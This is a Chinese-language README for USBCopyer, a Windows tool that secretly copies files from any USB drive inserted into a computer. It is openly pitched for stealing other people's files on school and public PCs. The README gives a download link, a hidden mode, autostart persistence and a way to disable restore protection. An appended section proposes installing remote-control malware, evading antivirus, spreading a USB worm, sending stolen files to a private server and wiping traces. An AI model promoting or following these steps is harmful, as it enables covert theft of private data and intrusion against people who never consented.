#USBCopyer: 插上U盘自动复制U盘文件
[![Build status](https://ci.appveyor.com/api/projects/status/xv5b8wf0h7cuy897?svg=true)](https://ci.appveyor.com/project/kenvix/usbcopyer)              
偷U盘文件的神器，支持设置冲突解决方案，支持延迟复制，支持扩展名黑白名单，支持磁盘分区号/序列号黑名单，支持日志，支持弹出U盘时强制停止复制防止占用              
本程序有两个图标，默认图标表示当前处于空闲状态，红色图标表示当前正在复制文件（工作中）              
![Screenshot](https://git.oschina.net/kenvix/USBCopyer/raw/master/usbcopyer.jpg)
##已编译版本下载
.Net Framework 3.5       
[点击从Git@OSC下载](https://git.oschina.net/kenvix/USBCopyer/raw/master/USBCopyer/bin/Release/USBCopyer.exe)         [点击从GitHub下载](https://github.com/kenvix/USBCopyer/blob/master/USBCopyer/bin/Release/USBCopyer.exe?raw=true)           
需要安装.Net Framework 3.5，[没有安装请点此](https://download.microsoft.com/download/7/0/3/703455ee-a747-4cc8-bd3e-98a615c3aedb/dotNetFx35setup.exe)
###适用场景
1.学校的老师上完课直接拔U盘走人，要课件还不给（LZ制作这个程序的背景）         
2.这是台公用电脑，你想要偷别人U盘的东西         
###如何使用
1.下载
2.双击 USBCopyer.exe
3.程序将在托盘区运行，右击图标可以进行调整
  点击 "隐藏图标" 将彻底隐藏程序，只能靠任务管理器停止
  点击 "设置" 可以设置程序
###命令行
USBCopyer.exe [/hide]           
   /hide     以隐藏模式启动，只能通过任务管理器结束进程
###常见问题
#####学校老师很精明，上课前都要自己重启一次电脑，怎么办
将本程序设为开机启动，以 **/hide** 参数启动          
创建一个快捷方式，然后加上参数，拖到 "开始菜单" 的 "启动" 文件夹即可
#####手机插在电脑上，能偷文件吗
MTP/PTP不行，如果是挂载到电脑上可以
#####U盘被拔了怎么办
诱惑他不要拔啊
#####电脑关机就还原了，老师上完课都会关电脑的
两种方法：       
1.插上你的U盘，然后启动本程序，加入该U盘到黑名单，然后设置输出目录到你的U盘         
2.用 PCHunter 之类的东西干掉还原程序
##代码仓库
[Git@OSC](https://git.oschina.net/kenvix/USBCopyer) [GitHub](https://github.com/kenvix/USBCopyer)            
[我的博客文章](https://zhizhe8.net/?p=86)


##以上是作者的说明
###个人的一些想法
1. 既然可以物理接触硬件了,关闭UAC,上远控[手动向杀软加入白名单,如果免杀,当我没说.完全把它控制在手中,肉鸡多一枚,蠕虫,感染U盘(被发现的风险增大),控制更多.
2. 得到文件的方式:将文件直接拖到自己的服务器上,或者用云存储服务,接口post,[寒假自己搞一搞,小目标之一]
3. 痕迹的清理同样需要一个脚本,定期执行,C:\Users\username\Recent,[一个批处理]
4. 对于有还原保护的,可以接触硬件,就不多说了.
其实大多数学校的服务器安全性都渣的一B,有些事做不做全凭个人良心;
>做人,有所为,有所不为(GPUinfo作者)
